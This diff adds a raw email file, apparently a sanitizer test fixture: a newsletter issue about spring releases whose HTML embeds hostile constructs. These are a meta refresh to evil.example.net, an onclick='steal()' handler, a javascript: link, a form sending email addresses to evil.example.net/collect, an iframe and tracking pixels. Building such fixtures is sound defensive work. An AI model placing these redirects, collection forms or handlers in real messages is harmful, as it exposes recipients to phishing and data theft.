@@ -1,0 +1,58 @@
+From: Example Weekly <news@news.example.org>
+To: anna@example.com
+Subject: [Example Weekly] Issue #42: Spring releases
+Date: Thu, 6 Mar 2025 06:00:00 -0500
+Message-ID: <issue42.abc@news.example.org>
+List-Id: Example Weekly <weekly.news.example.org>
+List-Unsubscribe: <https://news.example.org/unsubscribe/abc>,
+ <mailto:unsubscribe@news.example.org?subject=abc>
+List-Unsubscribe-Post: List-Unsubscribe=One-Click
+Authentication-Results: mx.example.com;
+ dkim=pass header.d=news.example.org;
+ spf=pass smtp.mailfrom=news.example.org;
+ dmarc=pass header.from=news.example.org
+Delivered-To: anna@example.com
+MIME-Version: 1.0
+Content-Type: text/html; charset=utf-8
+Content-Transfer-Encoding: 8bit
+
+<!DOCTYPE html>
+<html><head><meta charset="utf-8"><title>Example Weekly #42</title>
+<meta http-equiv="refresh" content="0;url=https://evil.example.net/">
+<link rel="stylesheet" href="https://news.example.org/style.css">
+<style>
+  body { margin: 0; background: #f4f4f4; }
+  .hero { background: url('https://news.example.org/img/hero-bg.jpg') no-repeat; }
+  @import url("https://news.example.org/more.css");
+</style>
+<script>document.write('tracking');</script>
+</head>
+<body onload="track()">
+<table width="100%" bgcolor="#f4f4f4" cellpadding="0" cellspacing="0" border="0"><tr><td align="center">
+  <table width="600" role="presentation" cellpadding="0" cellspacing="0" border="0">
+    <tr><td><a href="https://news.example.org/?utm_source=mail"><img src="https://news.example.org/img/logo.png" alt="Example Weekly" width="200" height="50"></a></td></tr>
+    <tr><td class="hero" style="padding:20px;background-image:url(https://news.example.org/img/hero.jpg)">
+      <h1 style="font-family:Arial">Spring releases are here</h1>
+      <p>This week: three new releases, a <em>community</em> spotlight and an event in Vienna.</p>
+      <table cellpadding="0" cellspacing="0"><tr><td bgcolor="#0066cc" style="border-radius:4px"><a href="https://news.example.org/r/1" style="color:#fff">Read the full story</a></td></tr></table>
+    </td></tr>
+    <tr><td>
+      <table width="100%" cellpadding="10"><tr>
+        <td width="50%"><img src="https://news.example.org/img/a.jpg" width="280" height="160" alt="Release A"><p>Release A brings faster sync.</p></td>
+        <td width="50%"><img src="https://news.example.org/img/b.jpg" width="280" height="160" alt="Release B"><p>Release B adds dark mode.</p></td>
+      </tr></table>
+    </td></tr>
+    <tr><td>
+      <table border="1" cellpadding="4"><tr><th>Release</th><th>Date</th></tr>
+        <tr><td>A 2.0</td><td>3 March</td></tr><tr><td>B 1.5</td><td>5 March</td></tr></table>
+    </td></tr>
+    <tr><td style="font-size:11px;color:#999">
+      <p>You get this because you subscribed. <a href="https://news.example.org/unsubscribe/abc" onclick="steal()">Unsubscribe</a> | <a href="javascript:alert(1)">Preferences</a></p>
+      <form action="https://evil.example.net/collect"><input type="email" name="e"><button>Send</button></form>
+      <iframe src="https://evil.example.net/frame"></iframe>
+    </td></tr>
+  </table>
+</td></tr></table>
+<img src="https://news.example.org/track/open.php?u=abc&amp;id=42" width="1" height="1" alt="">
+<img src="https://x1.r.us-east-1.awstrack.me/I0/abc/def" alt="">
+</body></html>
